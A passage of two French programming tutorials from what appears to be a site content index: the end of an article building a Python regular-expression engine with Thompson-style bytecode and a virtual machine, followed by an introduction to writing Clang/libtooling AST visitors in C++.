ce bytecode maintiendra en permanence deux pointeurs : un pointeur d'entrée (ou IP pour Input Pointer ) qui désigne la position courante dans la chaîne d'entrée du programme, un pointeur d'instruction (ou PP pour Program Pointer ) qui désigne l'adresse de l'instruction courante. En fait, étant donné que nous allons implémenter la stratégie de Thompson, PP ne sera pas unique : il y aura un PP par fil d'exécution. Nous pouvons maintenant détailler les opcodes compris par la machine virtuelle : L'instruction CHAR prend en argument le caractère à comparer à celui pointé par IP. Si les deux caractères sont égaux, IP et PP sont tous les deux incrémentés, sinon, le thread courant est détruit. L'instruction SUCCESS , unique, vérifie que l'entrée a bien été entièrement consommée, et quitte le programme sur un match positif. L'instruction JMP représente un saut inconditionnel : elle remplace la valeur de PP par l'adresse qui lui est passée en argument. L'instruction SPLIT sert à créer un nouveau thread dont le PP sera initialisé à l'adresse passée en argument. le PP du thread courant est ensuite incrémenté normalement. Lorsque tous les fils d'exécution sont supprimés, le match échoue et le programme est quitté sur un résultat négatif. Pour générer le bytecode d'une expression régulière à partir de son arbre syntaxique, nous allons utiliser ce que le Dragon Book nomme l'algorithme de McNaughton-Yamada-Thompson . Il s'agit en fait un algorithme proposé par Thompson dans son article de 1968 pour adapter celui de traduction d'une expression régulière en AFD (formulé par McNaugton et Yamada en 1960) à la création d'un AFN intermédiaire. Cet algorithme a le mérite d'être très simple à mettre en œuvre car il permet de construire un automate de façon incrémentale et directe : il consiste à décomposer l'automate d'une expression régulière en sous-automates liés entre eux par des règles de construction génériques. Considérons par exemple deux expressions rationnelles $A$ et $B$. Pour implémenter leur concaténation, nous n'avons pas besoin de connaître la structure interne de leurs automates. En fait, si nous avons le bytecode de $A$ et celui de $B$, il nous suffit de mettre les deux bout à bout : 1:[Début de A] ... N:[Fin de A] N+1:[Début de B] ... N+M:[Fin de B] L'union de deux expressions $(A\\mid B)$ consiste à séparer l'exécution en deux threads ; le premier exécutera le code de $A$ et le second celui de $B$. Les deux vont ensuite pointer sur la même instruction en sortie : 1:SPLIT N+1 2:[Début de A] ... N-1:[Fin de A] N:JMP M N+1:[Début de B] ... M-1:[Fin de B] M:_ Ici, l'instruction à l'adresse M a été remplacée par un underscore (_). Cela signifie que même si au moment où l'on génère le bytecode, nous ne savons pas encore ce qui va suivre $(A\\mid B)$ dans l'expression rationnelle, rien ne nous empêche de pointer dessus. Il ne nous reste plus qu'à définir les règles correspondant aux trois opérateurs unaires. Celles-ci sont en réalité assez simples. Pour $A?$ : 1:SPLIT N+1 2:[Début de A] ... N:[Fin de A] N+1:_ Pour $A+$ : 1:[Début de A] ... N-1:[Fin de A] N:SPLIT 1 Pour $A\\ast$ : 1:SPLIT N+1 2:[Début de A] ... N-1:[Fin de A] N:SPLIT 2 N+1:_ Notez que l'instruction SUCCESS n'entre en considération que lorsque l'on appose la \"touche finale\" à la génération du bytecode. C'est elle qui conclut les instructions de parcours de l'automate. Nous avons maintenant toutes les clés en main pour implémenter la production de code intermédiaire dans notre compilateur. Commençons par créer quatre classes, pour nos quatre instructions. OPCODE_CHAR = 1 OPCODE_SPLIT = 2 OPCODE_JMP = 3 OPCODE_SUCCESS = 4 class OpSplit : def __init__ ( self , target = None ): self . target = target def __str__ ( self ): if self . target is None : raise ValueError ( \"target of SPLIT opcode is None\" ) return 'SPLIT \\t %d ' % self . target def tuple ( self ): if self . target is None : raise ValueError ( \"target of SPLIT opcode is None\" ) return ( OPCODE_SPLIT , self . target ) class OpJump : def __init__ ( self , target = None ): self . target = target def __str__ ( self ): if self . target is None : raise ValueError ( \"target of JMP opcode is None\" ) return 'JMP \\t %d ' % self . target def tuple ( self ): if self . target is None : raise ValueError ( \"target of JMP opcode is None\" ) return ( OPCODE_JMP , self . target ) class OpChar : def __init__ ( self , val ): self . val = val def __str__ ( self ): return \"CHAR \\t ' %s '\" % self . val def tuple ( self ): return ( OPCODE_CHAR , self . val ) class OpSuccess : def __str__ ( self ): return \"SUCCESS\" def tuple ( self ): return ( OPCODE_SUCCESS , ) Chacune de ces classes surcharge sa méthode __str__ de manière à pouvoir être affichée dans la console, et définit une méthode tuple() , dont nous nous servirons lors de l'évaluation. Nous pourrions aussi définir une véritable représentation binaire pour ces instructions, mais cela ne nous apporterait rien de plus dans le cadre de cet article. Notez que les classes OpJump et OpSplit peuvent être instanciées sans argument, mais doivent avoir un argument target défini lorsque l'on cherche à les afficher. Cela vient du fait que, comme nous allons le voir, il est parfois nécessaire de pouvoir inclure l'une de ces instructions dans le bytecode avant de savoir où elles vont pointer. Nous pouvons aussi définir une classe Bytecode , qui n'est rien d'autre, en fait, qu'une liste. La propriété pos de cette classe sert simplement à retourner l'indice de la prochaine instruction qui sera ajoutée à la représentation intermédiaire. class Bytecode ( list ): @property def pos ( self ): return len ( self ) def __str__ ( self ): return ' \\n ' . join ( ' %d : %s ' % ( idx , op ) for idx , op in enumerate ( self )) Il ne nous reste plus qu'à dériver les classes de notre AST de façon à leur ajouter une méthode code() . Cette méthode prend en argument un objet Bytecode , pour écrire le code généré dans cet objet. En dehors de cela, leur implémentation reprend exactement les règles de l'algorithme de McNaughton-Yamada-Thompson. class Char : def __init__ ( self , val ): self . prec = 4 self . val = val def __str__ ( self ): s = self . val if s in \"()?*+|\" : s = \" \\\\ \" + s return s def code ( self , bytecode ): bytecode . append ( OpChar ( self . val )) class Closure ( Unop ): def __init__ ( self , arg ): Unop . __init__ ( self , CLOSURE , arg ) def code ( self , bytecode ): split_end = OpSplit () bytecode . append ( split_end ) split_begin = OpSplit ( bytecode . pos ) self . arg . code ( bytecode ) bytecode . append ( split_begin ) split_end . target = bytecode . pos class Option ( Unop ): def __init__ ( self , arg ): Unop . __init__ ( self , OPTION , arg ) def code ( self , bytecode ): split_end = OpSplit () bytecode . append ( split_end ) self . arg . code ( bytecode ) split_end . target = bytecode . pos class Repeat ( Unop ): def __init__ ( self , arg ): Unop . __init__ ( self , REPEAT , arg ) def code ( self , bytecode ): split_begin = OpSplit ( bytecode . pos ) self . arg . code ( bytecode ) bytecode . append ( split_begin ) class Cat ( Binop ): def __init__ ( self , left , right ): Binop . __init__ ( self , CAT , left , right ) def code ( self , bytecode ): self . left . code ( bytecode ) self . right . code ( bytecode ) class Union ( Binop ): def __init__ ( self , left , right ): Binop . __init__ ( self , UNION , left , right ) def code ( self , bytecode ): split_right = OpSplit () bytecode . append ( split_right ) self . left . code ( bytecode ) jump_end = OpJump () bytecode . append ( jump_end ) split_right . target = bytecode . pos self . right . code ( bytecode ) jump_end . target = bytecode . pos N'oublions pas de modifier la définition des fonctions que nous utilisons pour générer notre AST : char = Char option = Option closure = Closure repeat = Repeat union = Union cat = Cat Nous pouvons maintenant modifier notre code de test, de façon à afficher, en plus de la représentation sous forme d'AST, le bytecode des expressions régulières entrées par l'utilisateur. def compile_re ( input_str ): ast = Parser ( Lexer ( input_str )) . parse () b = Bytecode () ast . code ( b ) b . append ( OpSuccess ()) return ast , b if __name__ == '__main__' : while True : try : instr = input ( '>>> ' ) ast , b = compile_re ( instr ) print ( ast ) print ( str ( b )) # ... Vérifions dans la console : >>> (a|b)*cd (a|b)*cd 0:SPLIT 6 1:SPLIT 4 2:CHAR 'a' 3:JMP 5 4:CHAR 'b' 5:SPLIT 1 6:CHAR 'c' 7:CHAR 'd' 8:SUCCESS >>> a(bc|bb)d? a(bc|bb)d? 0:CHAR 'a' 1:SPLIT 5 2:CHAR 'b' 3:CHAR 'c' 4:JMP 7 5:CHAR 'b' 6:CHAR 'b' 7:SPLIT 9 8:CHAR 'd' 9:SUCCESS Cela fonctionne parfaitement. Implémentation de la machine virtuelle Pour implémenter la stratégie de Thompson de parcours des expressions rationnelles, nous n'avons pas besoin de créer explicitement des threads , ni même de maintenir le pointeur IP, puisque nous savons que nous n'avons besoin de boucler au plus qu'une seule fois sur la chaîne d'entrée. L'idée de la fonction suivante est de maintenir à tout instant une liste state décrivant l'état courant dans lequel se trouve la VM, c'est-à-dire la liste des instructions courantes à évaluer, ainsi qu'une liste next_state , décrivant la liste des instructions qui seront à évaluer lorsque l'on aura \"incrémenté IP\", c'est-à-dire lorsque l'on bouclera sur le caractère suivant de l'entrée. Cette implémentation, qui diffère assez de la définition formelle que nous avons faite plus haut de la machine virtuelle, a le mérite de laisser la place à une optimisation intéressante que nous évoquerons dans la section suivante. def match ( regex , input_str ): program = compile_re ( regex ) print ( str ( program )) next_state = [ 0 ] for c in list ( input_str ) + [ None ]: print ( '-' * 50 ) state , next_state = next_state , [] if not state : return False for pp in state : print ( \"input: ' %s ' pp: %d \" % ( c , pp ), end = ' ' ) op = program [ pp ] . tuple () if op [ 0 ] == OPCODE_SUCCESS : print ( '-> success?' , end = ' ' ) if c is None : print ( 'yes' ) return True else : print ( 'no' ) elif op [ 0 ] == OPCODE_CHAR : if c == op [ 1 ]: print ( \"-> continue\" ) next_state . append ( pp + 1 ) else : print ( \"-> drop\" ) elif op [ 0 ] == OPCODE_JMP : print ( '-> add state' , op [ 1 ]) state . append ( op [ 1 ]) elif op [ 0 ] == OPCODE_SPLIT : print ( '-> add states' , pp + 1 , op [ 1 ]) state . append ( pp + 1 ) state . append ( op [ 1 ]) return False Par commodité, on ajoute le singleton None à la fin de la chaîne d'entrée, de façon à gérer plus simplement l'instruction SUCCESS . Dernière subtilité : lorsque l'on tombe sur un saut SPLIT ou JMP , on ajoute simplement les PP correspondants à la fin de l'état courant , de manière à ce qu'ils soient exécutés durant le même tour de boucle. En dehors de cela, le code est plutôt simple à comprendre. Voici un exemple d'exécution : >>> match(\"a(bc|cb)d+\", \"abcdd\") 0:CHAR 'a' 1:SPLIT 5 2:CHAR 'b' 3:CHAR 'c' 4:JMP 7 5:CHAR 'c' 6:CHAR 'b' 7:CHAR 'd' 8:SPLIT 7 9:SUCCESS -------------------------------------------------- input: 'a' pp: 0 -> continue -------------------------------------------------- input: 'b' pp: 1 -> add states 2 5 input: 'b' pp: 2 -> continue input: 'b' pp: 5 -> drop -------------------------------------------------- input: 'c' pp: 3 -> continue -------------------------------------------------- input: 'd' pp: 4 -> add state 7 input: 'd' pp: 7 -> continue -------------------------------------------------- input: 'd' pp: 8 -> add states 9 7 input: 'd' pp: 9 -> success? no input: 'd' pp: 7 -> continue -------------------------------------------------- input: 'None' pp: 8 -> add states 9 7 input: 'None' pp: 9 -> success? yes True Pistes d'amélioration Le moteur d'expressions régulières que nous venons d'implémenter est assez basique : il permet simplement de vérifier qu'une chaîne de caractères arbitraire est conforme à une expression rationnelle. De plus, l'implémentation que nous avons étudiée dans cet article ne tient absolument pas compte des performances : elle a été pensée dans un but pédagogique. Voici quelques pistes que le lecteur peut explorer pour améliorer ce programme. Mise en cache de l'AFD d'une expression régulière Une première piste d'amélioration serait une optimisation de l'algorithme de matching , en essayant d'obtenir ce que nous appelons un Automate Fini Déterministe . Par exemple, un AFD équivalent de l'expression $a(cb\\mid bb)c$ serait le suivant : c +---+ a / \\ b c (0)---->(1) +->(2)--->(3)--->(4) \\ b / +---+ Où (0) est l'état initial de l'automate et (4) son état final. Par comparaison, si nous devions représenter l'AFN que l'algorithme de Thompson parcourt pour la même expression, nous aurions ceci : c b +--->(2)--->(3)--->(4)---+ a / \\ c (0)----->(1) (8)--->(9) \\ b b / +--->(5)--->(6)--->(7)---+ La différence entre un AFN et un AFD est qu'un AFN : Peut contenir des $\\varepsilon$-transitions , c'est-à-dire des transitions \"vides\" qui ne correspondent à aucun caractère d'entrée. Peut avoir plusieurs transitions sortant d'un état pour le même caractère d'entrée. Par corollaire, cela signifie qu'un AFN peut, lorsqu'il est parcouru, se trouver dans plusieurs états simultanément. Un AFD, à l'opposé, ne peut se trouver qu'en un seul état à la fois, et ne peut pas avoir plusieurs transitions sortantes d'un état donné pour un caractère donné. L'algorithme de Thompson, que nous venons d'étudier, permet de générer facilement l'AFD à partir de l'AFN d'une expression régulière. Mieux encore, il permet de générer cet AFD partiellement à la volée, alors même que l'on est en train d'évaluer l'expression régulière sur une chaîne d'entrée. Cela permet de mettre cet AFD en cache du programme, pour accélérer les exécutions suivantes sur la même expression régulière. En fait, cet algorithme que nous venons d'implémenter simule déjà le fonctionnement de l'AFD : nous n'avons pas nommé la liste de PP state pour rien puisqu'elle correspond exactement à un état de l'AFD équivalent. Imaginons que nous soyons en train d'évaluer l'expression $a(bc\\mid bb)d?$ sur l'entrée \"abbd\" . Le bytecode de l'expression régulière est le suivant : 0 : CHAR 'a' 1 : SPLIT 5 2 : CHAR 'b' 3 : CHAR 'c' 4 : JMP 7 5 : CHAR 'b' 6 : CHAR 'b' 7 : SPLIT 9 8 : CHAR 'd' 9 : SUCCESS L'état initial de l'AFD est bien entendu l'instruction 0 . Nous allons donc créer un nouvel état de l'AFD : A . Lorsque l'on évalue le premier caractère de la chaîne ( 'a' ), on s'aperçoit que l'on est propulsé vers l'état 1 . D'où : A := (0) A[a] => (1) Nous arrivons à un nouvel état de l'AFD que nous nommerons B . Lors de son évaluation, l'instruction SPLIT correspondant au PP 1 mènera vers les instructions 2 et 5 . En évaluant le prochain caractère d'entrée ( 'b' ), les deux instructions vont matcher. La liste next_state vaudra donc [3, 6] . On peut donc enrichir notre AFD avant de passer à l'étape suivante. A := (0) A[a] => B B := (1) B[b] => (3, 6) On peut alors créer un nouvel état C correspondant aux PP (3, 6) . Lorsque le caractère suivant ( 'b' ) arrive, l'instruction 3 échoue, mais l'instruction 6 va pousser l'adresse 7 dans next_state . D'où A := (0) A[a] => B B := (1) B[b] => C C := (3, 6) C[b] => (7) À l'étape suivante, l'instruction 7 ajoute à l'état courant les adresses 8 et 9 , et on évalue l'entrée 'd' . L'instruction à l'adresse 9 va échouer, mais celle à l'état 8 va ajouter 9 à la liste next_state , d'où : A := (0) A[a] => B B := (1) B[b] => C C := (3, 6) C[b] => D D := (7) D[d] => (9) Lors de la dernière étape, l'instruction à l'adresse 9 vérifie que l'entrée est vide, c'est le cas, d'où : A := (0) A[a] => B B := (1) B[b] => C C := (3, 6) C[b] => D D := (7) D[d] => E E := (9) E[EOI] => MATCH Si nous évaluions une seconde fois cette expression régulière, mais cette fois avec l'entrée \"abcd\" , nous aurions l'exécution suivante : L'état initial est mis en cache ( A ). Pour le caractère courant, a , il renvoie à l'état B . À l'état B , on consomme l'entrée suivante 'b' . Cette entrée est déjà gérée par le cache, on est renvoyé vers l'état C . Lorsque l'on consome le caractère suivant, 'c' , on s'aperçoit que celui-ci n'a pas encore été évalué. On récupère donc les adresses des instructions de l'état C , à savoir 3 et 6 , et on évalue l'AFN normalement. Cette fois-ci, l'instruction 6 échoue, mais 3 nous renvoie vers 4 . On peut donc enrichir l'état C : C := (3, 6) C[b] => D C[c] => (4) À l'itération suivante, on s'aperçoit que l'instruction 4 est un simple saut inconditionnel vers l'instruction 7 . Or nous avons déjà cette instruction en cache, il s'agit de l'état D . Cela nous permet donc de faire la liaison entre C et D : C := (3, 6) C[b] => D C[c] => D L'évaluation va ensuite parcourir l'état D puis l'état E qui sont dans le cache, avant de terminer sur un résultat positif. Cette mise en cache permet d'accélérer énormément l'évaluation d'une expression rationnelle. Le lecteur est encouragé à l'implémenter. Bien sûr, il est également possible de générer l'AFD directement sans passer par l'évaluation de l'AFN. Cette génération automatique peut en revanche prendre un temps assez considérable dans des cas pathologiques. De plus, l'AFD résultant peut contenir un très grand nombre d'états, très largement supérieur à la taille du bytecode , et donc avoir un impact non négligeable sur l'empreinte mémoire du programme. Le choix de générer un AFD initialement ou non doit donc dépendre du type d'application. Application réaliste des expressions régulières Dans un cas réaliste, on utilise très rarement le matching comme nous venons de l'implémenter. En fait, on chercherait plutôt à savoir si une expression régulière décrit une sous-chaîne de la chaîne d'entrée, et si oui, extraire la première sous-chaîne qui valide l'expression régulière. Cela implique d'essayer d'évaluer l'expression régulière en chaque position de la chaîne d'entrée jusqu'à obtenir un match . On a alors deux stratégies possibles : soit l'algorithme de matching est glouton ( greedy ), auquel cas on retourne la sous-chaîne la plus longue qui valide l'expression régulière (c'est-à-dire que l'on exécute l'automate jusqu'à ce qu'il n'y ait plus aucun état courant, et on retourne la dernière sous-chaîne ayant atteint une instruction SUCCESS ), soit l'algorithme est ungreedy , auquel cas on retourne le résultat dès que l'on tombe sur une instruction SUCCESS . On peut également envisager étendre notre langage des expressions régulières en lui ajoutant : Le symbole spécial . , qui correspond à n'importe quel caractère d'entrée , Les classes de caractères entre crochets (par exemple : [A-Za-z0-9] ), Les classes prédéfinies du Perl, comme par exemple \\d pour la classe [0-9] , et \\D pour désigner tout sauf un chiffre , Enfin, une dernière fonctionnalité indispensable à un moteur d'expressions régulières réaliste serait de rendre les parenthèses capturantes. Ainsi, chaque fois qu'une sous-chaîne valide une expression entre parenthèses, celle-ci est enregistrée soit dans un registre numéroté de 1 à 9 comme en Perl, ou bien, de façon plus commode à utiliser, dans une variable nommée. Par exemple : (!nombre:un|deux|trois) enregistrera la sous-chaîne définie par $un\\mid deux\\mid trois$ dans une variable nombre . On peut imaginer pour cela ajouter au bytecode deux instructions BEGIN_SUBMATCH et END_SUBMATCH . Cette dernière opération est un peu plus difficile à implémenter que les deux autres. En fait, elle impose de maintenir cette fois explicitement les threads en mémoire, chacun d'entre eux définissant un environnement qui peut être écrasé en cas d'échec du thread lors d'une capture. Cela constitue un excellent exercice pour maîtriser les tenants et les aboutissants de l'algorithme de Thompson. En implémentant un moteur d'expressions régulières, nous venons de réaliser un compilateur. Nous avons pu ainsi avoir un aperçu de : L'analyse lexicale, L'analyse syntaxique au moyen d'un parseur par analyse récursive descendante, Le développement d'arbres syntaxiques abstraits (AST), La production de code intermédiaire, L'implémentation d'un interpréteur sous la forme d'une machine virtuelle. En fait, un langage comme Python n'est pas si différent que ça de ce que nous venons d'étudier : son bytecode contient beaucoup plus d'instructions et sa sémantique est différente, mais en dehors de cela, la compilation et l'interprétation d'un programme Python suit exactement les mêmes étapes. Ce que nous venons d'étudier n'est en fait rien d'autre que la base de presque n'importe quel compilateur, le lecteur peut donc dès à présent étudier chacune de ces phases dans le détail, en comparant les nombreuses approches du parsing et les différentes classes de grammaire, ou bien en regardant de plus près les différentes opérations qui sont réalisées lors de la compilation de son langage favori. Ce genre de recherches est extrêmement instructif. Nous avons également étudié la notion d'automate et mis un pied dans le domaine des expressions rationnelles, dont l'énorme majorité des outils qui les utilisent suit encore, étonnament, la stratégie de backtracking , sacrifiant ainsi la stabilité au profit d'un plus grand nombre d'opérateurs. Le lecteur est encouragé à continuer de se renseigner sur l'exécution des expressions rationnelles, de manière à apprendre à formuler celles qu'il utilise de façon plus optimale, en sachant ce qui se produit en coulisse. Références Cet article a bien évidemment été écrit avec un exemplaire du Dragon Book constamment ouvert à portée de main : Aho, A., Sethi, R., & Ullman, J. (1989). Compilateurs. Principes, techniques et outils. InterEditions, Paris. Le lecteur y trouvera en particulier une description plus formelle de la création des ensembles $Premier$ et $Suivant$ des non-terminaux d'une grammaire LL(1), ainsi que de l'algorithme de McNaughton-Yamada-Thompson de génération d'un AFN. Concernant les expressions rationnelles, ce texte fait référence à l'article fondateur de Kleene, ainsi que les travaux de McNaughton et Yamada, enrichis plus tard par Ken Thompson : Kleene, S. C. (1951). Representation of events in nerve nets and finite automata . McNaughton, R. & Yamada, H. (1960). Regular expressions and state graphs for automata. Electronic Computers, IRE Transactions on, (1), 39-47. Thompson, K. (1968). Programming techniques: Regular expression search algorithm. Communications of the ACM, 11(6), 419-422. Sur un plan beaucoup moins formel, on trouve également une série d'articles écrits par Russ Cox, le créateur de la bibliothèque d'expressions régulières re2 , ainsi que de l'algorithme de recherche de Google Code Search , à l'adresse suivante : http://swtch.com/~rsc/regexp/ Ces articles ont été une source d'inspiration pour le bytecode de notre moteur d'expressions rationnelles. Ils décrivent également la façon dont fonctionne le moteur re2 , écrit en C++, et qui est basé sur l'algorithme que nous avons étudié ici."},{"tags":"content","url":"https://yliesc.github.io/pages/pdp/content/introduction-a-libclang","title":"Introduction à libclang","text":"Introduction Un adage populaire veut que tout programmeur soit le plus fainéant possible. Et la manipulation de code source déjà écrit (dans un but de refactorisation par exemple) est une tache pénible qui doit revenir à l'ordinateur. Le but de cet article est de présenter libclang, une interface à clang qui va nous aider dans cette tache. Le but final de l'article est d'écrire un petit outil pour créer automatiquement des fichiers squelettes à partir des headers. Introduction Clang-LLVM : Kezako ? AST Exemple basique Exemple sur des codes sources Examen des AST Parcours AST Visiteur de l'AST Consommateur d'AST Point d'entré Main Écriture d'un expander de header Contexte Analyse Écriture du visiteur Utilisation Conclusion Clang-LLVM : Kezako ? Clang est un compilateur (au même titre que g++ ou ICC) qui via divers frontend supporte le C, C++ et l'Objective C. Initié par Apple en 2005, il a été rendu open-source en 2007. Pour rappel, le travail essentiel d'un compilateur est de transformer un fichier texte en une représentation intermédiaire facilement manipulable. On peut visualiser cette représentation intermédiaire sous forme d'arbre abstrait de syntaxe (ou AST en anglais, pour Abstract syntax tree ) La gestion de cette représentation est confiée à LLVM (historiquement pour Low Level Virtual Machine ) qui se chargera de l'optimiser et de la retraduire en langage machine adapté à la cible (x86 ou ARM, Linux ou Windows, 32 ou 64 bits...) On peut résumer ceci par le schéma suivant : Par ailleurs, clang fournit plusieurs interfaces pour manipuler l'arbre résultant de la phase. La première est Libclang à proprement parler. C'est une interface stable de haut niveau écrite en C. Ensuite vient Clang Plugins, interface dédiée à la création de plugins intégrés dans clang qui seront appelés lors de la compilation. Enfin, vient libtooling une interface en C++ qui vise à faciliter l'écriture d'outils standalone. On va choisir la dernière, car elle correspond bien à ce qu'on souhaite faire. AST Exemple basique Pour illustrer la notion d'AST, il est plus simple de partir sur des exemples simples d'expressions arithmétiques . L'idée directrice est de construire un arbre,où chaque nœud va correspondre à un élément de l'expression (un nombre, un opérateur) et dont les fils (si applicable) sont ce sur quoi le nœud va agir. Il représente la structure du programme Exemple sur l'expression 2+3*5. C'est sous cette représentation qu'on peut facilement travailler l'expression. Exemple sur des codes sources NB : Je ne vais pas détailler ici comment se passe le processus de création des AST, juste utiliser le résultat. Si vous voulez en savoir plus, vous pouvez toujours regarder des cours de compilation. On peut étendre les AST pour représenter des codes sources en généralisant les noeuds. Par exemple, un noeud pourra symboliser une boucle while . Un de ses fils symbolisera la condition à remplir et l'autre le corps de la boucle. Avec le code source suivant, int foo ( int x ) { return 2 * x ; } int main ( int argc , char * argv []) { int i = 0 ; while ( foo ( i ) < 10 ) { ++ i ; } } clang génère l'AST suivant : FunctionDecl 0x2add210 </home/david/libclang/src/test.cpp:1:1, line:4:1> foo 'int (int)' |-ParmVarDecl 0x2add150 <line:1:9, col:13> x 'int' `-CompoundStmt 0x2add360 <line:2:1, line:4:1> `-ReturnStmt 0x2add340 <line:3:9, col:18> `-BinaryOperator 0x2add318 <col:16, col:18> 'int' '*' |-IntegerLiteral 0x2add2b8 <col:16> 'int' 2 `-ImplicitCastExpr 0x2add300 <col:18> 'int' <LValueToRValue> `-DeclRefExpr 0x2add2d8 <col:18> 'int' lvalue ParmVar 0x2add150 'x' 'int' FunctionDecl 0x2b089d0 </home/david/libclang/src/test.cpp:7:1, line:14:1> main 'int (int, char **)' |-ParmVarDecl 0x2add390 <line:7:10, col:14> argc 'int' |-ParmVarDecl 0x2b08900 <col:19, col:30> argv 'char **' `-CompoundStmt 0x2b08d30 <line:8:1, line:14:1> |-DeclStmt 0x2b08b08 <line:9:5, col:12> | `-VarDecl 0x2b08a90 <col:5, col:11> i 'int' | `-IntegerLiteral 0x2b08ae8 <col:11> 'int' 0 `-WhileStmt 0x2b08d08 <line:10:5, line:13:5> |-<<<NULL>>> |-BinaryOperator 0x2b08c78 <line:10:11, col:18> '_Bool' '<' | |-CallExpr 0x2b08c10 <col:11, col:16> 'int' | | |-ImplicitCastExpr 0x2b08bf8 <col:11> 'int (*)(int)' <FunctionToPointerDecay> | | | `-DeclRefExpr 0x2b08ba0 <col:11> 'int (int)' lvalue Function 0x2add210 'foo' 'int (int)' | | `-ImplicitCastExpr 0x2b08c40 <col:15> 'int' <LValueToRValue> | | `-DeclRefExpr 0x2b08b78 <col:15> 'int' lvalue Var 0x2b08a90 'i' 'int' | `-IntegerLiteral 0x2b08c58 <col:18> 'int' 10 `-CompoundStmt 0x2b08ce8 <line:11:5, line:13:5> `-UnaryOperator 0x2b08cc8 <line:12:9, col:11> 'int' lvalue prefix '++' `-DeclRefExpr 0x2b08ca0 <col:11> 'int' lvalue Var 0x2b08a90 'i' 'int' Le premier élément de chaque ligne correspond au type (au sens classe du C++) du nœud. La mise en page permet de visualiser les relations parent-enfant entre les différents nœuds. On retrouve aussi l'adresse de l'objet en mémoire, sa position dans le fichier source et si ceci a du sens, des informations sur son type dans le code source en fin de ligne. A noter que pour chaque élément de plus haut niveau (déclaration d'une fonction, d'une classe, d'une variable globale), clang va générer un AST. Donc dans le code précédant, il y a en réalité 2 AST. Un pour foo et un autre pour main . Examen des AST Chaque nœud d'un AST est une instance d'une classe dérivée soit de Decl soit de Stmt . Decl (pour Déclaration), représente une déclaration au sens général. Il existe des sous classes pour la déclaration de fonction, de classe ou de paramètre dune fonction. Je vous laisse admirer l'arbre d'héritage de la classe Decl pour vous faire une idée. Stmt (pour Statement ), représente différents types d'expression et de structure de contrôle associée. Là encore, il existe des sous classes pour tout. Du for au try-catch , tout y passe. De la même manière , l'arbre d'héritage résume bien la chose. Plusieurs remarques sont à faire : Les commentaires ne sont bien sur pas présents dans l'AST. En effet, ils sont la pour le programmeur, pas pour le compilateur. De la même façon, toutes les macros ont été évaluées, il n'y en a donc plus aucune trace dans l'AST. Enfin, en C++11 les variables déclarées avec un type auto ont vu leur type inféré. Parcours AST Maintenant qu'on dispose d'un AST, il faut le parcourir. Visiteur de l'AST La méthode classique est d'utiliser le pattern visiteur. Pour ce faire, on va donc déclarer une classe ExampleVisitor qui va dériver de la classe template RecursiveASTVisitor en utilisant le CRTP . class ExampleVisitor : public RecursiveASTVisitor < ExampleVisitor > { private : ASTContext * astContext ; public : explicit ExampleVisitor ( CompilerInstance * CI , StringRef file ) : astContext ( & ( CI -> getASTContext ())) { } virtual bool VisitTypeDecl ( Decl * d ) { return true ; } }; De cette façon, on dispose de fonctions telles que VisitVarDecl ou VisitTypeDecl qui seront appelées respectivement lors de la déclaration dune fonction ou lors de la déclaration d'un nouveau type. Plus généralement, pour une classe de TypeNoeud , on dispose de la fonction VisitNodeType(NodeType *) Ces fonctions doivent renvoyer true si le parsing doit continuer ou false si au contraire il doit s'arrêter. Notre classe dispose aussi d'un attribut ASTContext qui sert à stocker des informations connexes a l'AST. Il ne sera pas utilisé ici, mais peut servir à beaucoup de choses, dont récupérer le gestionnaire de source pour extraire du code ou savoir si une fonction est noexcept en C++11. Consommateur d'AST On va ensuite définir une classe ExampleASTConsumer qui va dériver de ASTConsumer et qui sera chargée de construire notre visiteur et d'appeler dessus la fonction membre TraverseDecl , qui réalisera un parcours de l'AST. On peut à ce niveau choisir si on veut un parcours de l'AST une fois que toute la translation unit a été parsée ( HandleTranslationUnit ), ou si au contraire on veut le faire à chaque déclaration de premier rang ( HandleTopLevelDecl ). Toujours dans l'objectif de faire un expander de header, on va choisir de le faire une fois toute la translation unit parsée. En effet, de cette façon, on va pouvoir savoir si des fonctions déclarées dans le header disposent d'une définition dans le fichier, puisque tout le fichier aura déjà été parsé. class ExampleASTConsumer : public ASTConsumer { private : ExampleVisitor * visitor ; public : explicit ExampleASTConsumer ( CompilerInstance * CI , StringRef file ) : visitor ( new ExampleVisitor ( CI , file )) { } virtual void HandleTranslationUnit ( ASTContext & Context ) { // de cette façon, on applique le visiteur sur l'ensemble de la translation unit visitor -> TraverseDecl ( Context . getTranslationUnitDecl ()); } }; Si on avait utilisé la seconde méthode (celle sur les déclarations de plus haut niveau), le code aurait été le suivant virtual bool HandleTopLevelDecl ( DeclGroupRef DR ) { for ( DeclGroupRef :: iterator b = DR . begin (), e = DR . end (); b != e ; ++ b ) Visitor . TraverseDecl ( * b ); return true ; } Avec ce code, pour chaque déclaration de plus haut niveau, on va parcourir chacune des déclarations contenues dans le groupe de déclaration DR . Ceci peut paraitre étrange (une déclaration de plus haut niveau qui en contient plusieurs), mais il suffit de penser à la déclaration de variable globale dans le style int g1,g2; pour se convaincre que ceci a du sens. Point d'entré Quand on écrit un outil basé sur libtooling, le point d'entré le plus courant se fait via FrontendAction . Cette classe permet l'exécution d'actions définies par l'utilisateur au moment de la compilation. On va créer une classe ExampleFrontendAction qui par commodité dérivera de ASTFrontendAction . En effet, cette dernière classe se charge d'exécuter l'action voulue. La seule charge qui nous incombe est la création d'un consommateur d'AST dans la fonction CreateASTConsumer . Cette dernière dispose de 2 paramètres. Le premier est le contexte de l'AST et le second une chaine de caractère représentant le fichier actuel. C'est grâce à cette dernière qu'on va pouvoir modifier le fichier source. class ExampleFrontendAction : public ASTFrontendAction { public : virtual ASTConsumer * CreateASTConsumer ( CompilerInstance & CI , StringRef file ) { return new ExampleASTConsumer ( & CI , file ); }; Main Dans le main, il ne reste plus qu'à créer les objets pour parser la ligne de commande, créer l'outil et le lancer. Le parsage des options de la ligne de commande offert par libclang peut sembler être trop pour un projet de cette taille mais permet en réalité une grande souplesse à moindre coût. En effet, on peut passer à notre outil tous les flags nécessaires de la même manière que si on compilait le code qu'on souhaite analyser. Ceci est très utile si on veut par exemple activer le C++11 (-std=c++11) ou indiquer qu'il faut aussi chercher des header dans tel répertoire (classique option -I/path) int main ( int argc , const char ** argv ) { CommonOptionsParser op ( argc , argv ); ClangTool Tool ( op . getCompilations (), op . getSourcePathList ()); int result = Tool . run ( newFrontendActionFactory < ExampleFrontendAction > ()); return result ; } Compilation : Sous Fedora, il faut installer les paquets de développement de llvm et clang ainsi que llvm-static et on compile avec clang++ -std=c++11 `llvm-config --cxxflags --ldflags` Example.cpp -o app -lclangFrontend -lclangSerialization -lclangDriver 